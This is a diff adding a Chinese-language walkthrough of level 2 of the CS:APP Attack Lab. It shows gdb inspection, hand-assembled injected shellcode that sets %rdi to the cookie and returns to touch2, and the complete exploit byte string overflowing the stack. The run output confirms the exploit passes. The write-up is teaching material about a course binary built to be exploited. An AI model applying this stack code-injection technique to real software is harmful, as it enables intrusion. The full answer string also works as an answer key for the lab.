@@ -87,3 +87,87 @@ PASS: Would have posted the following:
 
 阅读一下README文件，查看一下我们的目标，我们需要返回到`touch2()`函数，并且设置好cookie的值。我们查看`touch2()`函数的地址,修改我们的exploit.txt文件。
 `00000000004017ec`
+
+查看`touch2()`的汇编代码
+```
+00000000004017ec <touch2>:
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
+  4017f0:	89 fa                	mov    %edi,%edx
+  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
+  4017f9:	00 00 00 
+  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
+  401802:	75 20                	jne    401824 <touch2+0x38>
+```
+我们需要使寄存器`%rdi`的值等于cookie的值。我们设置好`touch2()`的返回地址后，打断点查看一下cookie的值和%rdi的值
+```
+(gdb) p/x $edi
+$8 = 0xf7fb6980
+(gdb) x/16gx 0x202ce2+$rip
+0x6044e4 <cookie>:      0x0000000059b997fa      0x0000000000000000
+0x6044f4:       0x0000000000000000      0x3320303300000000
+0x604504 <gets_buf+4>:  0x2033332032332031      0x3134203533203433
+0x604514 <gets_buf+20>: 0x3320303320323420      0x2033332032332031
+0x604524 <gets_buf+36>: 0x3134203533203433      0x3320303320323420
+0x604534 <gets_buf+52>: 0x2033332032332031      0x3134203533203433
+0x604544 <gets_buf+68>: 0x3320303320323420      0x2033332032332031
+0x604554 <gets_buf+84>: 0x3134203533203433      0x3320303320323420
+```
+我们研究一下怎么修改%rdi的值使其等于cookie,先看一下%rdi的值是怎么来的，研究汇编代码发现，在调用`touch2()`函数之前，`%rdi`的值由`Gets()`函数设置的。
+```assembly
+401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
+```
+```(gdb) x/x 0x202a62+0x401a6e
+0x6044d0 <infile>:      0x00007ffff7fb6980
+```
+修改%rdi的值需要注入代码来修改%rdi的值，我们可以在输入字符串中注入下列代码(这里为什么要使用pushq指令呢？因为我们需要在修改%rdi的值后返回到`touch2()`函数，所以我们需要将`touch2()`函数的地址压入栈中，然后使用ret指令返回到`touch2()`函数)，通过注入下列代码
+```assembly
+mov $cookie, %rdi
+pushq $0x4017ec
+ret 
+```
+的机器码来修改%rdi的值。怎么得到这个机器码呢？我们先编写一段需要注入的汇编代码
+```assembly
+.text                   #代码（指令）
+.globl _start           #全局符号_start，链接器从这里开始执行
+_start:                 #程序入口
+mov $0x59b997fa, %rdi   #将cookie的值放入rdi寄存器
+pushq $0x4017ec         #将touch2函数的地址压入栈中
+ret                     #返回到touch2函数
+```
+先生成目标文件，然后再反汇编查看机器码
+```
+unix> as --64 -o tmp.o tmp.s
+unix> objdump -d tmp.o
+
+tmp.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00          pushq  $0x4017ec
+   c:   c3                      retq                      retq
+```
+可以得到我们需要注入的代码为`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`，我们将这个机器码注入到输入字符串中，并且设置好返回地址为这个栈地址，就可以运行我们注入的代码来修改%rdi的值了。 
+***
+下面为完整的输入字符串
+```
+48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00  
+
+```
+运行结果
+```
+(gdb) run -q < exploit-raw.txt
+Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+[Inferior 1 (process 34464) exited normally]
+```
+
+
+
